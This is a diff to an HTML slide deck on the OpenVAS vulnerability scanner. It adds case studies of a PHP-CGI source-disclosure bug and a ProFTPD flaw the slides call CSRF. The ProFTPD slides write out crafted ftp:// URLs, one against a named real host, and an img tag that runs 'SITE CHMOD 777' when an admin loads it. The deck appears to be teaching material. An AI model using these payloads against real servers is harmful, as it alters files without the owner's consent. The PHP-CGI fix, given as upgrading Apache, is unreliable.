@@ -54,10 +54,13 @@
               <ol>
                 <li>MySQL weak password</li>
                 <li>VRFY & EXPN in Postfix</li>
+                <li>PHP-CGI vulnerability</li>
+                <li>ProFTPD arbitrary command execution</li>
               </ol>
             </li>
             <li>Comparisons</li>
           </ul>
+          <p>Not spell checked.</p>
         </section>
           
         <section>
@@ -121,7 +124,10 @@
         </section>
         
         <section>
-          <h3>Architecture</h3>
+          <h1>OpenVAS Architecture</h1>
+        </section>
+        
+        <section>
           <img src='res/arch.png' style='width: 100%;'/>
         </section>
         
@@ -198,7 +204,7 @@
         </section>
         
         <section>
-          <h1>Usage</h1>
+          <h1>OpenVAS Usage</h1>
         </section>
         
         <section>
@@ -228,6 +234,7 @@
           <pre><code class='bash'># openvas-nvt-sync</code></pre>
           <p>or from the GSA</p>
           <img src='res/sync.png' style='width: 50%;'/>
+          <p>Curently there are ~33000 NVTs.</p>
         </section>
         
         <section>
@@ -295,6 +302,10 @@
         <section>
           <p>Solutions usually sugest upgrading the application, but not always.</p>
           <img src='res/solution.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <h1>Case studies</h1>
         </section>
         
         <section>
@@ -643,10 +654,87 @@ $ </code></pre>
         </section>
         
         <section>
-          <h2>Comparisons</h2>
-          <ul>
-            <li></li>
-          </ul>
+          <h2>3. PHP-CGI vulnerability</h2>
+          <img src='res/php1.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <p>How to view source in PHP.</p>
+          <img src='res/php4.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <p>How the page normally looks.</p>
+          <img src='res/php6.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <p>Using the <code>-s</code> vulnerability:</p>
+          <img src='res/php3.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <img src='res/php2.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <h3>Solution</h3>
+          <p>Upgrade Apache to the newest version.</p>
+        </section>
+        
+        <section>
+          <h2>4. ProFTPD Cross-site Request Forgery</h2>
+          <img src='res/ftp1.png' style='width: 100%;'/>
+        </section>
+        
+        <section>
+          <p>The problem in the source code is the use of a while loop and of fgets(). What happens is that long commands like:</p>
+          <pre>"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</pre>
+          <p>will be split in</p>
+
+          <pre>500 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA':
+command not understood.
+500'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+</pre>
+        </section>
+        
+        <section>
+          <p>So requesting this from a browser:</p>
+          <pre><code>ftp://cxib@127.0.0.1//////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+/////////////////////////////////////syst</code></pre>
+          <p>Will also result in <code>SYST</code> being executed.</p>
+          <p>From here the bug can be exploited like any other CSRF attack. Example: inserting a crafted img tag and tricking an admin to execute it.</p>
+        </section>
+        
+        <section>
+          <p>Example:</p>
+<pre><code>ftp://ftp.netbsd.org//////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+/////////////////////////////////////SITE%20CHMOD%20777%20EXAMPLEFILE</code></pre>
+
+<p>will change permission to EXAMPLEFILE when the owner will use this URL.</p>
+
+<p>So this needs to be inserted into a page that the admin will visit: <code>&lt;img src="ftp://.../SITE%20CHMOD%20777%20EXAMPLEFILE"&gt;</code></p>
+        </section>
+        
+        <section>
+          <h3>Solution</h3>
+          <p>The vulnerable parts of ProFTPD have been patched and are available in the newest versions.</p>
+        </section>
+        
+        <section>
+          <h1>Comparisons</h1>
         </section>
         
         <section>
@@ -713,13 +801,8 @@ behind.</blockquote>
             <li><a href='http://www.openvas.org/software.html'>www.openvas.org/software.html</a></li>
             <li><a href='http://www.openvas.org/compendium/openvas-compendium.html'>www.openvas.org/compendium/openvas-compendium.html</a></li>
             <li><a href='http://security.lss.hr/images/stories/documents/Nessus_vs_OpenVAS_en.pdf'>security.lss.hr/images/stories/documents/Nessus_vs_OpenVAS_en.pdf</a></li>
-            <li><a href=''></a></li>
-          </ul>
-          
-          <h3>Resources</h3>
-          <ul style="font-size: 0.8em; line-height:1em;">
-          </ul>
-          
+            <li><a href='http://bugs.proftpd.org/show_bug.cgi?id=3115'>bugs.proftpd.org/show_bug.cgi?id=3115</a></li>
+          </ul>          
         </section>
           
         <section data-state="shaderload" data-background="#000">
